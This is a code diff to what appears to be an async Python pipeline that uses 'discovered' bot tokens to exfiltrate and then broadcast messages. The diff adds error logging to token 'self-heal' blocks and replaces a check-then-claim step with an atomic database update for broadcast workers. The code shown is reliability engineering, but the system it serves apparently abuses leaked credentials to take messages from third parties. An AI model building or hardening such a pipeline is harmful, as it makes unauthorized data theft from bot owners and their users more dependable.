@@ -66,12 +66,13 @@ async def _exfiltrate_logic(cred_id: str):
         if not encrypted_token.startswith("gAAAA"):
             # Likely raw token from "bugged" scanner run
             bot_token = encrypted_token
-            # SELF-HEAL: Encrypt and update DB
+            # SELF-HEAL: Encrypt and update DB BEFORE using the token downstream
             try:
                 new_enc = security.encrypt(bot_token)
                 await async_execute(db.table("discovered_credentials").update({"bot_token": new_enc}).eq("id", cred_id))
                 logger.info(f"    🩹 [Exfil] Self-healed unencrypted token for {cred_id}")
-            except: pass
+            except Exception as heal_err:
+                logger.warning(f"    ⚠️ [Exfil] Self-heal encrypt failed for {cred_id}: {heal_err}")
         else:
             bot_token = security.decrypt(encrypted_token).strip()
     except Exception as e:
@@ -164,12 +165,13 @@ async def _enrich_logic(cred_id: str):
         if not record["bot_token"].startswith("gAAAA"):
              # Likely raw token
             bot_token = record["bot_token"]
-            # SELF-HEAL
+            # SELF-HEAL: Encrypt and update DB BEFORE using the token downstream
             try:
                 new_enc = security.encrypt(bot_token)
                 await async_execute(db.table("discovered_credentials").update({"bot_token": new_enc}).eq("id", cred_id))
                 logger.info(f"    🩹 [Enrich] Self-healed unencrypted token for {cred_id}")
-            except: pass
+            except Exception as heal_err:
+                logger.warning(f"    ⚠️ [Enrich] Self-heal encrypt failed for {cred_id}: {heal_err}")
         else:
             bot_token = security.decrypt(record["bot_token"]).strip()
     except Exception as e:
@@ -348,52 +350,35 @@ async def _broadcast_logic():
             # ==========================================================
             # STEP 1: ATOMIC CLAIM via DB (works across ALL environments)
             # ==========================================================
-            # We use a two-step approach:
-            # 1. Check current state of the message
-            # 2. Only update if still valid to claim
-            
-            # First, get fresh state from DB
-            fresh = await async_execute(db.table("exfiltrated_messages")\
-                .select("is_broadcasted, broadcast_claimed_at")\
-                .eq("id", msg_id)\
-                .single()\
-                )
-            
-            if not fresh.data:
-                logger.warning(f"    ⚠️ Message {msg_id} not found in DB, skipping")
-                continue
-            
-            # Check if already broadcasted (another worker completed it)
-            if fresh.data.get("is_broadcasted"):
-                already_done_count += 1
-                continue
-            
-            # Check if claimed by another worker recently
-            claimed_at = fresh.data.get("broadcast_claimed_at")
-            if claimed_at:
-                # Parse timestamp and check if stale
-                try:
-                    if isinstance(claimed_at, str):
-                        claimed_time = datetime.fromisoformat(claimed_at.replace('Z', '+00:00'))
-                    else:
-                        claimed_time = claimed_at
-                    
-                    if claimed_time > stale_threshold:
-                        # Claim is fresh - another worker is handling this
-                        skipped_count += 1
-                        continue
-                    else:
-                        logger.warning(f"    🔄 Stale claim detected for {msg_id}, reclaiming...")
-                except Exception as e:
-                    logger.error(f"    ⚠️ Error parsing claimed_at for {msg_id}: {e}")
-            
-            # Claim this message by setting claimed_at to NOW
+            # Single conditional UPDATE — only succeeds if message is unclaimed and not yet broadcast.
+            # This eliminates the TOCTOU race between check and claim.
             claim_time = datetime.now(timezone.utc).isoformat()
-            await async_execute(db.table("exfiltrated_messages")\
+
+            # Attempt to claim an unclaimed message
+            claim_result = await async_execute(db.table("exfiltrated_messages")\
                 .update({"broadcast_claimed_at": claim_time})\
                 .eq("id", msg_id)\
                 .eq("is_broadcasted", False)\
+                .is_("broadcast_claimed_at", "null")\
                 )
+
+            if not claim_result.data:
+                # Either already broadcasted, or claimed by another worker.
+                # Try reclaiming if the existing claim is stale.
+                stale_iso = stale_threshold.isoformat()
+                reclaim_result = await async_execute(db.table("exfiltrated_messages")\
+                    .update({"broadcast_claimed_at": claim_time})\
+                    .eq("id", msg_id)\
+                    .eq("is_broadcasted", False)\
+                    .lt("broadcast_claimed_at", stale_iso)\
+                    )
+
+                if not reclaim_result.data:
+                    # Could not claim — either done or freshly claimed by another worker
+                    skipped_count += 1
+                    continue
+
+                logger.warning(f"    🔄 Stale claim reclaimed for {msg_id}")
             
             logger.info(f"    📌 Claimed message {msg_id}")
             
